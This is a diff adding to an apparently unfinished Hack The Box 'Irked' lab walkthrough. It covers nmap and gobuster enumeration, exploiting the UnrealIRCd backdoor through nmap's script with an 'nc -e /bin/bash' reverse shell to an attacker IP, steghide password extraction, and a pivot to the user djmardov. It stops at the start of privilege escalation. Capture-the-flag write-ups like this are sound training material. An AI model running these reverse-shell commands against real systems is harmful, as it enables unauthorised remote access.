@@ -144,4 +144,202 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 12.18 seconds
 ```
 
-I also
+The nmap scan also revealed the admin's email along with the host name.
+
+So, I added the host's name into the `/etc/hosts` file.
+
+```
+echo "10.10.10.117  irked.htb" > /etc/hosts
+```
+
+## Enumeration
+I started enumeration by visiting the website on port `80`. I
+
+
+
+gobuster 
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.117
+===============================================================
+Gobuster v3.4
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.117
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.4
+[+] Timeout:                 10s
+===============================================================
+2023/03/04 08:13:18 Starting gobuster in directory enumeration mode
+===============================================================
+/manual               (Status: 301) [Size: 313] [--> http://10.10.10.117/manual/]
+/server-status        (Status: 403) [Size: 300]
+Progress: 220546 / 220561 (99.99%)
+===============================================================
+2023/03/04 09:00:34 Finished
+===============================================================
+```
+
+vulnerable to backdoor
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
+└─$ nmap -p 6697,8067,65534 --script irc-unrealircd-backdoor 10.10.10.117
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 09:13 EST
+Nmap scan report for irked.htb (10.10.10.117)
+Host is up (0.13s latency).
+
+PORT      STATE SERVICE
+6697/tcp  open  ircs-u
+8067/tcp  open  infi-async
+|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
+65534/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 18.34 seconds
+                                                              
+```
+
+
+port vulnerable to nmap script
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
+└─$ nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.30 4444"  10.10.10.117
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 09:28 EST
+Nmap scan report for irked.htb (10.10.10.117)
+Host is up (0.13s latency).
+
+PORT     STATE SERVICE
+8067/tcp open  infi-async
+|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again).
+
+Nmap done: 1 IP address (1 host up) scanned in 22.93 second
+```
+
+
+shell
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.30] from (UNKNOWN) [10.10.10.117] 39852
+whoami
+ircd
+```
+
+
+Grabbing user flag, but permission denied.
+
+```
+ircd@irked:/home/djmardov$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+```
+
+
+
+
+backup file.
+```
+ircd@irked:/home/djmardov/Documents$ ls -la
+ls -la
+total 12
+drwxr-xr-x  2 djmardov djmardov 4096 Sep  5 08:41 .
+drwxr-xr-x 18 djmardov djmardov 4096 Sep  5 08:41 ..
+-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
+lrwxrwxrwx  1 root     root       23 Sep  5 08:16 user.txt -> /home/djmardov/user.txt
+```
+
+contents of backup
+```
+ircd@irked:/home/djmardov/Documents$ cat .backup
+cat .backup
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+```
+
+wget the file
+```  
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
+└─$ wget 10.10.10.117/irked.jpg
+--2023-03-04 12:06:36--  http://10.10.10.117/irked.jpg
+Connecting to 10.10.10.117:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 34697 (34K) [image/jpeg]
+Saving to: ‘irked.jpg’
+
+irked.jpg                                                                      100%[====================================================================================================================================================================================================>]  33.88K  --.-KB/s    in 0.1s    
+
+2023-03-04 12:06:37 (260 KB/s) - ‘irked.jpg’ saved [34697/34697]
+```
+
+Using steghide to extract
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
+└─$ steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
+wrote extracted data to "pass.txt".
+
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
+└─$ cat pass.txt
+Kab6h+m+bbp2J:HG
+```
+
+Pivoting to djmardov
+```
+ircd@irked:/home/djmardov/Documents$ su djmardov
+su djmardov
+Password: Kab6h+m+bbp2J:HG
+
+djmardov@irked:~/Documents$ whoami
+whoami
+djmardov
+```
+
+grabbing user flag
+
+```
+djmardov@irked:~/Documents$ cat user.txt
+cat user.txt
+[REDACTED]
+```
+
+
+ssh into djmardov
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Irked]
+└─$ ssh djmardov@10.10.10.117
+The authenticity of host '10.10.10.117 (10.10.10.117)' can't be established.
+ED25519 key fingerprint is SHA256:Ej828KWlDpyEOvOxHAspautgmarzw646NS31tX3puFg.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.117' (ED25519) to the list of known hosts.
+djmardov@10.10.10.117's password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
+djmardov@irked:~$ 
+```
+
+## Privilege Escalation
+
+Viewuser
+```
+djmardov@irked:~$ cd /usr/bin
+djmardov@irked:/usr/bin$ viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2023-03-04 07:59 (:0)
+djmardov pts/1        2023-03-04 12:09 (10.10.14.30)
+sh: 1: /tmp/listusers: Permission denied
+```
+
+
